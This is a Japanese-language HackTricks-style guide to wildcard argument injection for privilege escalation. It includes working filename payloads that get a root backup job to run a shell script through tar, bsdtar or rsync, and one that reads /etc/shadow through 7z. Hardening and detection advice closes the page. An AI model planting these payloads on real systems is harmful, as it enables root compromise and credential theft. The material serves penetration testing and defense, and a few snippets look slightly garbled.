# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> ワイルドカード（別名 *glob*）**引数インジェクション**は、特権スクリプトが `tar`、`chown`、`rsync`、`zip`、`7z` などのUnixバイナリを、引用符なしのワイルドカード `*` と共に実行する際に発生します。
> シェルはバイナリを実行する**前に**ワイルドカードを展開するため、作業ディレクトリにファイルを作成できる攻撃者は、`-` で始まるファイル名を作成することで、**データではなくオプション**として解釈されるようにし、任意のフラグやコマンドを効果的に密輸することができます。
> このページでは、2023-2025年の最も有用なプリミティブ、最近の研究、現代の検出方法を集めています。

## chown / chmod

`--reference` フラグを悪用することで、**任意のファイルの所有者/グループまたはパーミッションビットをコピー**できます：
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
ルートが後で次のようなものを実行するとき:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` が注入され、*すべての* 一致するファイルが `/root/secret``file` の所有権/権限を継承します。

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (複合攻撃)。
詳細については、古典的な DefenseCode の論文を参照してください。

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

**チェックポイント** 機能を悪用して任意のコマンドを実行します:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
一度rootが例えば`tar -czf /root/backup.tgz *`を実行すると、`shell.sh`がrootとして実行されます。

### bsdtar / macOS 14+

最近のmacOSのデフォルトの`tar`（`libarchive`に基づく）は`--checkpoint`を実装していませんが、外部コンプレッサーを指定できる**--use-compress-program**フラグを使用することで、コード実行を達成することができます。
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
特権スクリプトが `tar -cf backup.tar *` を実行すると、`/bin/sh` が起動します。

---

## rsync

`rsync` は、`-e` または `--rsync-path` で始まるコマンドラインフラグを介してリモートシェルやリモートバイナリをオーバーライドすることを可能にします：
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
もしrootが後で`rsync -az * backup:/srv/`でディレクトリをアーカイブすると、注入されたフラグがリモート側でシェルを起動します。

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync`モード)。

---

## 7-Zip / 7z / 7za

特権スクリプトが*防御的に*ワイルドカードの前に`--`を付けて（オプション解析を止めるために）も、7-Zipフォーマットは**ファイルリストファイル**をサポートしており、ファイル名の前に`@`を付けることができます。それをシンボリックリンクと組み合わせることで、*任意のファイルを外部に抽出*できます：
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
もしrootが次のようなコマンドを実行すると:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zipは`root.txt`（→ `/etc/shadow`）をファイルリストとして読み取ろうとし、**stderrに内容を出力します**。

---

## zip

`zip`は、アーカイブがテストされるときにシステムシェルに*そのまま*渡されるフラグ`--unzip-command`をサポートしています：
```bash
zip result.zip files -T --unzip-command "sh -c id"
```
Inject the flag via a crafted filename and wait for the privileged backup script to call `zip -T` (test archive) on the resulting file.

---

## 追加のバイナリ：ワイルドカードインジェクションに脆弱なもの (2023-2025 クイックリスト)

以下のコマンドは、現代のCTFや実際の環境で悪用されています。ペイロードは常に、後でワイルドカードで処理される書き込み可能なディレクトリ内の*ファイル名*として作成されます：

| バイナリ | 悪用するフラグ | 効果 |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → 任意の `@file` | ファイル内容の読み取り |
| `flock` | `-c <cmd>` | コマンドの実行 |
| `git`   | `-c core.sshCommand=<cmd>` | SSH経由でのgitによるコマンド実行 |
| `scp`   | `-S <cmd>` | sshの代わりに任意のプログラムを起動 |

これらのプリミティブは*tar/rsync/zip*のクラシックよりも一般的ではありませんが、ハンティングの際には確認する価値があります。

---

## 検出とハードニング

1. **重要なスクリプトでシェルグロビングを無効にする**: `set -f` (`set -o noglob`) はワイルドカードの展開を防ぎます。
2. **引数を引用またはエスケープする**: `tar -czf "$dst" -- *` は*安全ではありません* — `find . -type f -print0 | xargs -0 tar -czf "$dst"`を好むべきです。
3. **明示的なパス**: `*`の代わりに`/var/www/html/*.log`を使用して、攻撃者が`-`で始まる兄弟ファイルを作成できないようにします。
4. **最小特権**: 可能な限り、バックアップ/メンテナンスジョブをrootではなく特権のないサービスアカウントとして実行します。
5. **監視**: Elasticの事前構築されたルール*Potential Shell via Wildcard Injection*は、`tar --checkpoint=*`、`rsync -e*`、または`shell child process`に直後に続く`zip --unzip-command`を探します。EQLクエリは他のEDRに適応できます。

---

## 参考文献

* Elastic Security – Potential Shell via Wildcard Injection Detected rule (最終更新 2025)
* Rutger Flohil – “macOS — Tar wildcard injection” (2024年12月18日)

{{#include ../../banners/hacktricks-training.md}}
